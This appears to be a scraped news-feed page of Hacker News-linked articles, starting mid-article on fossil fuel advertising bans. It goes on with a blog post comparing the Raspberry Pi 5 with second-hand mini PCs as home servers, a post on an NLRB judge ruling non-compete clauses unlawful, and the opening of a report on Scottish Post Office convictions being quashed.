data-contentid="DVWP7M35TJHP3AL725OTGVECA4" data-el="text" dir="null">But bans that are partial, such as those that only target TV commercials, are less effective. Companies may just reallocate their advertising budgets to other media, or shift to sponsoring sports teams and similar.</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="4QV5CMPSZRBGFGXAYE5DTBPUXI" data-el="text" dir="null">“It’s like a tube of toothpaste,” said David Hammond, a professor of public health at the University of Waterloo. “If you press in just one spot, it just squeezes to another part of the tube.”</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="I25TBOYU2VB4XGZL6BF3C7COGQ" data-el="text" dir="null">Fossil fuels also present a particular challenge: While an individual can choose not to smoke, it is almost impossible to disconnect from an electricity grid that runs partly on fossil fuels. Ad bans can target some discretionary spending, like cruise ships and air travel, but oil, gas and coal are deeply embedded in everyday life.</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="II7OMBGFZ5H6TMYA5PJZHESDRQ" data-el="text" dir="null">Parker, the city councilor, says that there are still reasons to target sources of global warming. “We protect people from things like gambling, alcohol, and tobacco,” he said. “Climate change is a different type of harm, but it’s still a harm.”</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="4NBEDPX22FCCTLYGNBNSA2553U" data-el="text" dir="null">Meanwhile, some advocates and scholars emphasize that advertising allows companies to shape their public image, which can protect them from stricter regulation.</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="EI4ESXJ4LFAT5K36RPXITCKRTI" data-el="text" dir="null">Researchers say that fossil fuel companies use ads to maintain their “social license to operate” — a shorthand for a corporation’s ability to be seen as acceptable by society and policymakers. By showing ads connecting their operations to clean energy, jobs, or energy security — and sponsoring popular events — fossil fuel companies can bolster their reputations in the public sphere.</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="2V2LR5FUEZCLXK5QJ6MRRR2UHU" data-el="text" dir="null">“Political scientists refer to fossil fuel advertising as a form of ‘outside’ lobbying,” said Geoffrey Supran, associate professor of environmental science and policy at the University of Miami. “It complements lobbying inside the Hill and in state governments and so on.”</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="R7TNUGIUYRA5VN4CEXOHFHXQXM" data-el="text" dir="null">Earlier this month, for example, the fossil fuel company Chevron sponsored the annual Congressional Baseball Game — which was interrupted by <a href="https://www.washingtonpost.com/dc-md-va/2024/06/12/congressional-baseball-game-arrests-climate-activists/?itid=lk_inline_manual_32" target="_blank">climate protesters</a>.</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="ZYTXPN4XDBBKRBK7GWJBLHBSLI" data-el="text" dir="null">Robert Brulle, a visiting professor of environment and society at Brown University, says that advertising allows fossil fuel companies to help define the solutions to climate change — such as things like carbon capture from oil and gas plants. “They’re saying ‘We need to be part of the solution, we have the technical know-how,’” Brulle explained.</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="3ETU2DQF3FCQXDVG64OPJTE5ZM" data-el="text" dir="null">In one <a href="https://link.springer.com/article/10.1007/s10584-019-02582-8" target="_blank">study</a> by Brulle and his co-authors, the researchers found that fossil fuel companies increased their advertising spending in response to congressional attention to and media coverage of climate change.</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="LF53Y2HKRVA7BHQEM4GUHLQHLY" data-el="text" dir="null">Even if there were substantial advertising bans instituted for fossil fuels, it would be difficult to measure how such bans affect a company’s reputation. But some experts believe that it could make a difference. “It would be monumental,” said Supran. “It could loosen the stranglehold of the industry in a way that would politically and financially open the door to lower carbon technologies.”</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="YQFY2ZL6GFDE5BR6LZC7SGS4BE" data-el="text" dir="null">For now, ad bans are still only instituted in a small number of cities and nations worldwide — in a manner not so different from how tobacco advertising bans began. “It happened incrementally,” said Hammond. “It was a multi-decade process.”</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Raspberry Pi 5 Is No Match for a Tini-Mini-Micro PC (307 pts)]]></title>
            <link>https://louwrentius.com/the-raspberry-pi-5-is-no-match-for-a-tini-mini-micro-pc.html</link>
            <guid>40697831</guid>
            <pubDate>Sun, 16 Jun 2024 15:38:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://louwrentius.com/the-raspberry-pi-5-is-no-match-for-a-tini-mini-micro-pc.html">https://louwrentius.com/the-raspberry-pi-5-is-no-match-for-a-tini-mini-micro-pc.html</a>, See on <a href="https://news.ycombinator.com/item?id=40697831">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
              <p>I've always been fond of the idea of the Raspberry Pi. An energy efficient, small, cheap but capable computer. An ideal home server. Until the Pi 4, the Pi was not that capable, and only with the relatively recent Pi 5 (fall 2023) do I feel the Pi is OK performance wise, although still hampered by SD card performance<sup id="fnref:good"><a href="#fn:good">1</a></sup>. And the Pi isn't that cheap either.</p>
<p>The Pi 5 can be fitted with an NVME SSD, but for me it's too little, too late.
Because I feel there is a type of computer on the market, that is much more compelling than the Pi. </p>
<p>I'm talking about the <a href="https://www.servethehome.com/introducing-project-tinyminimicro-home-lab-revolution/">tinyminimicro</a> home lab 'revolution' started by
<a href="https://www.servethehome.com/">servethehome.com</a> about four years ago (2020).</p>
<p><img alt="mini pc" src="https://louwrentius.com/static/images/tmm/tmm01.webp"></p>
<p><em>A 1L mini PC (Elitedesk 705 G4) with a Raspberry Pi 5 on top</em></p>
<p>During the pandemic, the Raspberry Pi was in short supply and people started looking for alternatives. The people at servethehome realised that these small enterprise desktop PCs could be a good option. Dell (micro), Lenovo (tiny) and HP (mini) all make these small desktop PCs, which are also known as 1L (one liter) PCs.</p>
<p>These Mini PC are not cheap<sup id="fnref:cheap"><a href="#fn:cheap">2</a></sup> when bought new, but older models are sold at a very steep discount as enterprises offload old models by the thousands on the second hand market (through intermediates).</p>
<p>Although these computers are often several years old, they are still much faster than a Raspberry Pi (including the Pi 5) and can hold more RAM.</p>
<p>I decided to buy two HP Elitedesk Mini PCs to try them out, one based on AMD and the other based on AMD.</p>
<h3>The Hardware</h3>
<table>
<thead>
<tr>
<th></th>
<th><a href="https://support.hp.com/th-en/document/c05371240">Elitedesk Mini G3 800</a></th>
<th><a href="https://support.hp.com/us-en/document/c06101574">Elitedesk Mini G4 705</a></th>
</tr>
</thead>
<tbody>
<tr>
<td>CPU</td>
<td>Intel i5-6500 (65W)</td>
<td>AMD Ryzen 3 PRO 2200GE (35W)</td>
</tr>
<tr>
<td>RAM</td>
<td>16 GB (max 32 GB)</td>
<td>16 GB (max 32 GB)</td>
</tr>
<tr>
<td>HDD</td>
<td>250 GB (SSD)</td>
<td>250 GB (NVME)</td>
</tr>
<tr>
<td>Network</td>
<td>1Gb (Intel)</td>
<td>1Gb (Realtek)</td>
</tr>
<tr>
<td>WiFi</td>
<td>Not installed</td>
<td>Not installed</td>
</tr>
<tr>
<td>Display</td>
<td>2 x DP, 1 x VGA</td>
<td>3 x DP</td>
</tr>
<tr>
<td>Remote management</td>
<td>Yes</td>
<td>No</td>
</tr>
<tr>
<td>Idle power</td>
<td>4 W</td>
<td>10 W</td>
</tr>
<tr>
<td>Price</td>
<td>€160</td>
<td>€115</td>
</tr>
</tbody>
</table>
<p>The AMD-based system is cheaper, but you 'pay' in higher idle power usage. In absolute terms 10 watt is still decent, but the Intel model directly competes with the Pi 5 on idle power consumption. </p>
<p><a href="https://louwrentius.com/static/images/tmm/tmm03.webp"><img alt="inside the mini pic" src="https://louwrentius.com/static/images/tmm/tmm03_small.webp"></a></p>
<p><em>Elitedesk 705 left, Elitedesk 800 right (click to enlarge)</em></p>
<p>Regarding display output, these devices have two fixed displayport outputs, but there is one port that is configurable. It can be displayport, VGA or HDMI. Depending on the supplier you may be able to configure this option, or you can buy them separately for €15-€25 online.</p>
<p><a href="https://louwrentius.com/static/images/tmm/HPEliteDesk800G3DesktopMini.pdf"><img alt="back800" src="https://louwrentius.com/static/images/tmm/tmm06.webp"></a>
<a href="https://louwrentius.com/static/images/tmm/HPEliteDesk705G4DesktopMini.pdf"><img alt="back705" src="https://louwrentius.com/static/images/tmm/tmm05.webp"></a>
<em>Click on image for official specs in PDF format</em></p>
<p>Both models seem to be equipped with socketed CPUs. Although options for this formfactor are limited, it's possible to upgrade.</p>
<h3>Comparing cost with the Pi 5</h3>
<p>The Raspberry Pi 5 with (max) 8 GB of RAM costs ~91 Euro, almost exactly the same price as the AMD-based mini PC<sup id="fnref:psu"><a href="#fn:psu">3</a></sup> in its base configuration (8GB RAM). Yet, with the Pi, you still need:</p>
<ol>
<li>power supply (€13)</li>
<li>case (€11)</li>
<li>SD card or NVME SSD (€10-€45)</li>
<li>NVME hat (€15) (optional but would be more comparable)</li>
</ol>
<p>It's true that I'm comparing a new computer to a second hand device, and you can decide if that matters in this case. With a complete Pi 5 at around €160 including taxes and shipping, the AMD-based 1L PC is clearly the cheaper and still more capable option.</p>
<h3>Comparing performance with the Pi 5</h3>
<p>The first two rows in this table show the Geekbench 6 score of the Intel and AMD mini PCs I've bought for evaluation. I've added the benchmark results of some other computers I've access to, just to provide some context.</p>
<table>
<thead>
<tr>
<th>CPU</th>
<th>Single-core</th>
<th>Multi-core</th>
</tr>
</thead>
<tbody>
<tr>
<td>AMD Ryzen 3 PRO 2200GE (32W)</td>
<td>1148</td>
<td>3343</td>
</tr>
<tr>
<td>Intel i5-6500 (65W)</td>
<td>1307</td>
<td>3702</td>
</tr>
<tr>
<td>Mac Mini M2</td>
<td>2677</td>
<td>9984</td>
</tr>
<tr>
<td>Mac Mini i3-8100B</td>
<td>1250</td>
<td>3824</td>
</tr>
<tr>
<td>HP Microserver Gen8 Xeon E3-1200v2</td>
<td>744</td>
<td>2595</td>
</tr>
<tr>
<td>Raspberry Pi 5</td>
<td>806</td>
<td>1861</td>
</tr>
<tr>
<td>Intel i9-13900k</td>
<td>2938</td>
<td>21413</td>
</tr>
<tr>
<td>Intel E5-2680 v2</td>
<td>558</td>
<td>5859</td>
</tr>
</tbody>
</table>
<p>Sure, these mini PCs won't come close to modern hardware like the Apple M2 or the intel i9. But if we look at the performance of the mini PCs we can observe that:</p>
<ol>
<li>The Intel i5-6500T CPU is 13% faster in single-core than the AMD Ryzen 3 PRO</li>
<li>Both the Intel and AMD processors are 42% - 62% faster than the Pi 5 regarding single-core performance.</li>
</ol>
<h3>Storage (performance)</h3>
<p>If there's one thing that really holds the Pi back, it's the SD card storage.
If you buy a decent SD card (A1/A2) that doesn't have terrible random IOPs performance, you realise that you can get a SATA or NVME SSD for almost the same price that has more capacity and much better (random) IO performance.</p>
<p>With the Pi 5, NVME SSD storage isn't standard and requires an extra hat. I feel that the missing integrated NVME storage option for the Pi 5 is a missed opportunity that - in my view - hurts the Pi 5.</p>
<p>Now in contrast, the Intel-based mini PC came with a SATA SSD in a special mounting bracket. That bracket also contained a small fan(1) to keep the underlying NVME storage (not present) cooled. </p>
<p><a href="https://louwrentius.com/static/images/tmm/tmm04.webp"><img alt="inside the mini pic" src="https://louwrentius.com/static/images/tmm/tmm04_small.webp"></a></p>
<p><em>There is a fan under the SATA SSD (click to enlarge)</em></p>
<p>The AMD-based mini PC was equipped with an NVME SSD and was not equipped with the SSD mounting bracket. The low price must come from somewhere...</p>
<p>However, both systems have support for SATA SSD storage, an 80mm NVME SSD and a small 2230 slot for a WiFi card. There seems no room on the 705 G4 to put in a small SSD, but there are adapters available that convert the WiFi slot to a slot usable for an extra NVME SSD, which might be an option for the 800 G3.</p>
<h3>Noice levels (subjective)</h3>
<p>Both systems are barely audible at idle, but you will notice them (if you sensitive to that sort of thing). The AMD system seems to become quite loud under full load. The Intel system also became loud under full load, but much more like a Mac Mini: the noise is less loud and more tolerable in my view.</p>
<h2>Idle power consumption</h2>
<h3>Elitedesk 800 (Intel)</h3>
<p>I can get the Intel-based Elitedesk 800 G3 to 3.5 watt at idle. Let that sink in for a moment. That's about the same power draw as the Raspberry Pi 5 at idle!</p>
<p>Just installing Debian 12 instead of Windows 10 makes the idle power consumption drop from 10-11 watt to around 7 watt. </p>
<p>Then on Debian, you:</p>
<ol>
<li>run <code>apt install powertop</code></li>
<li>run <code>powertop --auto-tune</code> (saves ~2 Watt)</li>
<li>Unplug the monitor (run headless) (saves ~1 Watt)</li>
</ol>
<p>You have to put the <code>powertop --auto-tune</code> command in /etc/rc.local:</p>
<div><pre><span></span><code><span>#!/usr/bin/env bash</span>
powertop<span> </span>--auto-tune
<span>exit</span><span> </span><span>0</span>
</code></pre></div>

<p>Then apply <code>chmod +x /etc/rc.local</code></p>
<p>So, for about the same idle power draw you get so much more performance, and go beyond the max 8GB RAM of the Pi 5.</p>
<h3>Elitedesk 705 (AMD)</h3>
<p>I managed to get this system to 10-11 watt at idle, but it was a pain to get there. </p>
<p>I measured around 11 Watts idle power consumption running a preinstalled Windows 11 (with monitor connected). After installing Debian 12 the system used 18 Watts at idle and so began a journey of many hours trying to solve this problem. </p>
<p>The culprit is the integrated Radeon Vega GPU. To solve the problem you have to:</p>
<ol>
<li>Configure the 'bios' to only use UEFI</li>
<li>Reinstall Debian 12 using UEFI</li>
<li>install the appropriate firmware with <code>apt install firmware-amd-graphics</code></li>
</ol>
<p>If you boot the computer using legacy 'bios' mode, the AMD Radeon firmware won't load no matter what you try. You can see this by issuing the commands:</p>
<div><pre><span></span><code>rmmod<span> </span>amdgpu
modprobe<span> </span>amdgpu
</code></pre></div>

<p>You may notice errors on the physical console or in the logs that the GPU driver isn't loaded because it's missing firmware (a lie).</p>
<p>This whole process got me to around 12 Watt at idle. To get to <strong>~10 Watts idle</strong> you need to do also run <code>powertop --auto-tune</code> and disconnect the monitor, as stated in the 'Intel' section earlier.</p>
<p>Given the whole picture, 10-11 Watt at idle is perfectly okay for a home server, and if you just want the cheapest option possible, this is still a fine system.</p>
<h2>KVM Virtualisation</h2>
<p>I'm running vanilla KVM (Debian 12) on these Mini PCs and it works totally fine. I've created multiple virtual machines without issue and performance seemed perfectly adequate. </p>
<h2>Boot performance</h2>
<p>From the moment I pressed the power button to SSH connecting, it took 17 seconds for the Elitedesk 800.</p>
<p>The Elitedesk 705 took 33 seconds until I got an SSH shell.</p>
<p>These boot times include the 5 second boot delay within the GRUB bootloader screen that is default for Debian 12.</p>
<h2>Remote management support</h2>
<p>Some of you may be familiar with <a href="https://en.wikipedia.org/wiki/Intelligent_Platform_Management_Interface">IPMI</a> (ILO, DRAC, and so on) which is standard on most servers. But there is also similar technology for (enterprise) desktops.</p>
<p>Intel <a href="https://en.wikipedia.org/wiki/Intel_Management_Engine">AMT/ME</a> is a technology used for remote out-of-band management of computers. It can be an interesting feature in a homelab environment but I have no need for it. If you want to try it, you can follow <a href="https://en.wikipedia.org/wiki/Intel_Management_Engine">this guide</a>.</p>
<p>For most people, it may be best to disable the AMT/ME feature as it has a history of security vulnerabilities. This may not be a huge issue within a trusted home network, but you have been warned.</p>
<p>The AMD-based Elitedesk 705 didn't came with equivalent remote management capabilities as far as I can tell.</p>
<h2>Alternatives</h2>
<p>The models discussed here are older models that are selected for a particular price point. Newer models from Lenovo, HP and Dell, equip more modern processors which are faster and have more cores. They are often also priced significantly higher. </p>
<p>If you are looking for low-power small formfactor PCs with more potent or customisable hardware, you may want to look at second-hand NUC formfactor PCs.</p>
<h2>Stacking multiple mini PCs</h2>
<p>The AMD-based Elitedesk 705 G4 is closed at the top and it's possible to stack other mini PCs on top. </p>
<p>The Intel-based Elitedesk 800 G3 has a perforated top enclosure, and putting another mini pc on top might suffocate the CPU fan.</p>
<p><img alt="topbottom" src="https://louwrentius.com/static/images/tmm/tmm07_small.webp"></p>
<p>As you can see, the bottom/foot of the mini PC doubles as a VESA mount and has four screw holes. By putting some screws in those holes, you may effectively create standoffs that gives the machine below enough space to breathe (maybe you can use actual standoffs).</p>
<h2>Evaluation and conclusion</h2>
<p>I think these second-hand 1L tinyminimicro PCs are better suited to play the role of home (lab) server than the Raspberry Pi (5). </p>
<p>The increased CPU performance, the built-in SSD/NVME support, the option to go beyond 8 GB of RAM (up to 32GB) and the price point on the second-hand market really makes a difference. </p>
<p>I love the Raspberry Pi and I still have a ton of Pi 4s. This <a href="https://louwrentius.com/i-made-my-blog-solar-powered-then-things-escalated.html">solar-powered</a> blog is hosted on a Pi 4 because of the low power consumption and the availability of GPIO pins for the solar status display. </p>
<p>That said, unless the Raspberry Pi becomes a lot cheaper (and more potent), I'm not so sure it's such a compelling home server.</p>

            </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[NLRB judge declares non-compete clause is an unfair labor practice (348 pts)]]></title>
            <link>https://www.nlrbedge.com/p/in-first-case-of-its-kind-nlrb-judge</link>
            <guid>40696992</guid>
            <pubDate>Sun, 16 Jun 2024 13:40:26 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nlrbedge.com/p/in-first-case-of-its-kind-nlrb-judge">https://www.nlrbedge.com/p/in-first-case-of-its-kind-nlrb-judge</a>, See on <a href="https://news.ycombinator.com/item?id=40696992">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9bc49767-e9ba-4305-8c65-9f4243361e92_1638x2048.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9bc49767-e9ba-4305-8c65-9f4243361e92_1638x2048.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9bc49767-e9ba-4305-8c65-9f4243361e92_1638x2048.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9bc49767-e9ba-4305-8c65-9f4243361e92_1638x2048.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9bc49767-e9ba-4305-8c65-9f4243361e92_1638x2048.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9bc49767-e9ba-4305-8c65-9f4243361e92_1638x2048.jpeg" width="1456" height="1820" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/9bc49767-e9ba-4305-8c65-9f4243361e92_1638x2048.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1820,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:544238,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9bc49767-e9ba-4305-8c65-9f4243361e92_1638x2048.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9bc49767-e9ba-4305-8c65-9f4243361e92_1638x2048.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9bc49767-e9ba-4305-8c65-9f4243361e92_1638x2048.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9bc49767-e9ba-4305-8c65-9f4243361e92_1638x2048.jpeg 1456w" sizes="100vw" fetchpriority="high"></picture></div></a></figure></div><p><span>Administrative Law Judge (ALJ) Sarah Karpinen issued her decision in </span><em><strong><a href="https://nlrbresearch.com/pdfs/09031d4583d765f7.pdf" rel="">J.O. Mory, Inc.</a></strong></em><span> yesterday. The case mostly revolves around an employer firing a union organizer that became employed at the company with the goal of organizing his coworkers (also known as “salting”). The union salt in this case lied about his employment history to get hired, declared he was a union organizer after being hired, and then was fired. Salting is protected activity, lying about your employment history to salt is also protected activity, and firing someone for salting is an unfair labor practice. Thus, Judge Karpinen ordered that the employer rehire the salt with backpay.</span></p><p><span>As part of litigating this case, the General Counsel (GC) of the National Labor Relations Board (NLRB) also alleged that the employer’s non-compete clause and coworker non-solicitation clause were illegal work rules under the </span><em><a href="https://nlrbresearch.com/pdfs/09031d4583af43bd.pdf" rel="">Stericycle</a></em><span> standard. The GC has been pursuing this </span><a href="https://nlrbresearch.com/pdfs/09031d4583a87168.pdf" rel="">particular legal theory</a><span> since early last year, but this is the first time the theory has been put in front of an ALJ and also the first time an ALJ has ruled that these kinds of clauses are unfair labor practices that violate the National Labor Relations Act (NLRA).</span></p><p>The non-compete clause in question states that:</p><blockquote><p>(A) For a period of twelve (12) months following termination or separation of employment for any reason, Employee will not directly or indirectly, on Employee's behalf or on behalf of others:  … (iii) Engage in, be employed by, or become interested in, in any manner or capacity, as a principal, agent, partner, officer, director, employee, consultant, independent contractor, advisor or in any other capacity, with any insurance agency, insurance business or in any other business similar or competitive with Employer’s business as the same may exist at any time during the term of this Agreement, this covenant restricting Employee’s employment being limited to Employer’s service area which is defined as the county of the office where the Employee is located and to all contiguous counties thereto. If, during Employee’s employment, Employee is employed in any other of Employer’s locations, then these restrictions shall also apply to the county in which such office is located, and to all contiguous counties to that location. The parties expressly agree that the restrictions above set forth are fair and reasonable with regard to scope, time periods, geographic area and in all other respects.</p></blockquote><p>The ALJ determined that this clause was illegal with the following reasoning:</p><blockquote><p><span>The non-compete provision in Provision 2(A) is overly broad in scope and would deter a reasonable employee from engaging in protected activity by barring employees from directly or indirectly, and in any capacity, engaging in, being employed by, or becoming interested in any enterprise that is “similar or competitive” to the employer’s business. Not only is this provision ridiculously broad in scope (could an employee indirectly engage with a competitor by sending a family member to buy something from its store?), but </span><strong>it would also cause a reasonable employee to refrain from engaging in protected activities that come with a risk of retaliation. If an employee knows they are barred from being involved in any capacity with any company that operates a similar business to Respondent, they will logically be more fearful of being fired and less willing to rock the boat because they face the prospect of being unable to find any work in their geographic area if they are fired or forced to leave their job.</strong></p></blockquote><p>The coworker non-solicitation clause in question states that:</p><blockquote><p>(C) During the term of this Agreement and for a period of 24 months after termination of employment for any reason, Employee will not, either directly or indirectly for himself or on behalf of others, solicit, encourage, or attempt to persuade any other employee of Employer to leave the employ of Employer. This is intended to prevent “pirating” of Employer employees.</p></blockquote><p>The ALJ determined that this clause was illegal with the following reasoning:</p><blockquote><p><span>The prohibition in Provision 1(C) on soliciting employees to leave Respondent’s employ would </span><strong>dissuade a reasonable employee from engaging in protected activity like telling their coworkers about the wages and benefits offered by the Union out of a reasonable fear that Respondent might accuse them of inducing other employees to quit</strong><span>. See </span><strong><a href="https://nlrbresearch.com/pdfs/09031d45800b7ca9.pdf" rel="">M.J. Mechanical Services, 325 NLRB 1098, 1106 (1998)</a></strong><span> (telling employees about union benefits, encouraging them to engage in salting activities, and referring them to union hall protected even when it resulted in one employee going to work for a union contractor). </span><strong>It may also deter employees from asking their coworkers to make a concerted threat to quit unless their working conditions improve.</strong><span> See </span><strong><a href="https://nlrbresearch.com/pdfs/09031d4583883f78.pdf" rel="">Morgan Corp., 371 NLRB No. 142, slip op. at 5 (2022)</a></strong><span> (employee who told supervisor that he and his co-workers would quit over demand for higher wages was “indisputably” engaged in protected concerted activity).</span></p></blockquote><p>Despite all the discussion about the FTC banning non-competes, there still seems to be little recognition that non-competes for non-supervisory workers are effectively impossible to enforce at the moment due to the policies of the NLRB GC.</p></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Post Office scandal victims in Scotland have convictions quashed (103 pts)]]></title>
            <link>https://www.computerweekly.com/news/366588932/Post-Office-scandal-victims-in-Scotland-have-convictions-quashed</link>
            <guid>40696077</guid>
            <pubDate>Sun, 16 Jun 2024 10:45:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.computerweekly.com/news/366588932/Post-Office-scandal-victims-in-Scotland-have-convictions-quashed">https://www.computerweekly.com/news/366588932/Post-Office-scandal-victims-in-Scotland-have-convictions-quashed</a>, See on <a href="https://news.ycombinator.com/item?id=40696077">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p><img src="https://www.computerweekly.com/visuals/ComputerWeekly/Hero%20Images/Injustice-justice-tech-algorthim-adobe_searchsitetablet_520X173.jpg" data-credit="Proxima Studio - stock.adobe.com" srcset="https://www.computerweekly.com/visuals/ComputerWeekly/Hero%20Images/Injustice-justice-tech-algorthim-adobe_searchsitetablet_520X173.jpg 960w,https://www.computerweekly.com/visuals/ComputerWeekly/Hero%20Images/Injustice-justice-tech-algorthim-adobe.jpg 1280w" width="520" height="173" alt=""></p><p>Proxima Studio - stock.adobe.com</p>
</div><div id="content-header">



<h2>Scotland follows England, Wales and Northern Ireland in exonerating wrongfully convicted subpostmasters en masse</h2>
</div><div id="content-center">


<ul>
<li><i data-icon="1"></i></li>
<li><i data-icon="2"></i></li>

</ul> <section id="content-body">
<p>Former subpostmasters and Post Office branch staff who were wrongfully convicted of crimes based on flawed computer evidence in Scotland have had their convictions quashed.</p>

<p>Emergency legislation to exonerate wrongfully convicted Post Office workers has completed its journey through Scottish Parliament and each will now receive initial compensation of £600,000, with the ability to claim more as financial redress for their suffering.</p>
<p>This mirrors <a href="https://www.computerweekly.com/news/366573392/Unprecedented-bill-to-exonerate-hundreds-of-wrongly-convicted-Post-office-workers-arrives">legislation in Westminster</a>, which covers England, Wales and Northern Ireland. In Westminster, <a href="https://www.computerweekly.com/news/366586358/Over-700-wrongful-subpostmaster-convictions-overturned-by-new-legislation">emergency legislation was pushed through</a> last month to overturn the convictions of hundreds of former subpostmasters and their staff. Prime minister Rishi Sunak promised the blanket exoneration after an ITV drama and documentary about the scandal angered the public.</p>
<p>Scotland’s justice secretary, Angela Constance, wrote to subpostmasters to set out the next steps. “Of course, no amount of compensation can fully mend the lives that were torn apart by this miscarriage of justice,” she said.</p>
<p>“I will be writing to those affected to tell them their convictions have been quashed and ensuring court records are changed, so the victims of this scandal can have their good names restored as quickly as possible. They have already waited too long for justice.”</p>
<p>In September 2020, following a large number of cases referred for appeal by England’s Criminal Cases Review Commission (CCRC), the Scottish CCRC took what it described as an “unusual step” and wrote to more than 70 people with potential wrongful convictions. It&nbsp;<a href="https://www.computerweekly.com/news/252497665/Potential-miscarriages-of-justice-of-Scottish-subpostmasters-move-to-full-review">began reviewing the first set of cases</a>&nbsp;in March 2021.</p>
<p>Scotland has a separate legal system, and the Scottish CCRC is traditionally about 10% of the size of the CCRC in England in terms of cases.</p>
<section data-menu-title="Successful appeal">
<h2><i data-icon="1"></i>Successful appeal</h2>
<p>The first wrongful conviction of a subpostmaster in Scotland was <a href="https://www.computerweekly.com/news/366553756/First-subpostmaster-Horizon-conviction-overturned-in-Scotland">overturned in September</a>. Susan Sinclair, who previously ran a branch in north-east Scotland, saw her appeal against conviction successful at the High Court in Edinburgh.</p>
<p>In the UK, between 2000 and 2015, 736 subpostmasters were convicted of crimes including theft and false accounting after the Post Office prosecuted them using evidence from the Horizon retail and accounting system used in thousands of branches.</p>
<p>The Horizon system was proved to be error-prone during a&nbsp;<a href="https://www.computerweekly.com/news/252451492/Why-subpostmasters-and-Post-Office-are-battling-it-out-in-the-High-Court">High Court legal battle that began in 2018</a>. Led by former subpostmaster Alan Bates, a group of 555 members of the&nbsp;<a href="https://www.computerweekly.com/news/1280090846/Post-masters-form-action-group-after-accounts-shortfall">Justice for Subpostmasters Alliance</a>&nbsp;(JFSA) sued the Post Office to prove that errors in the Horizon system were causing unexplained accounting discrepancies.</p>
<p>The CCRC began reviewing English cases in 2015, and the first convictions to be overturned&nbsp;<a href="https://www.computerweekly.com/news/252493522/History-made-as-subpostmasters-wrongly-prosecuted-in-Horizon-IT-scandal-have-convictions-quashed">came in December 2020</a>. Since then, more than 100 former subpostmasters and branch staff have had convictions overturned. The&nbsp;<a href="https://www.computerweekly.com/news/366553756/First-subpostmaster-Horizon-conviction-overturned-in-Scotland">first wrongful conviction of a subpostmaster overturned in Scotland</a>&nbsp;came in September 2023.</p>
<p>The Post Office scandal was&nbsp;<a href="https://www.computerweekly.com/news/2240089230/Bankruptcy-prosecution-and-disrupted-livelihoods-Postmasters-tell-their-story">first exposed by Computer Weekly in 2009</a>, revealing the stories of seven subpostmasters and the problems they suffered due to accounting software. It is one of the biggest miscarriages of justice in British history (<i>see below for timeline of Computer Weekly articles about the scandal, since 2009</i>).</p>
<hr>
<p>• Also read: <a href="https://www.computerweekly.com/feature/Post-Office-Horizon-scandal-explained-everything-you-need-to-know">What you need to know about the Horizon scandal</a> •</p>
<p>• Also watch: <a href="https://www.itv.com/watch/mr-bates-vs-the-post-office-the-real-story/10a1798/10a1798a0001">ITV’s documentary – <em>Mr Bates vs The Post Office: The real story</em></a> •</p>
<hr>

</section></section>




<section id="DigDeeperSplash">
<h4>
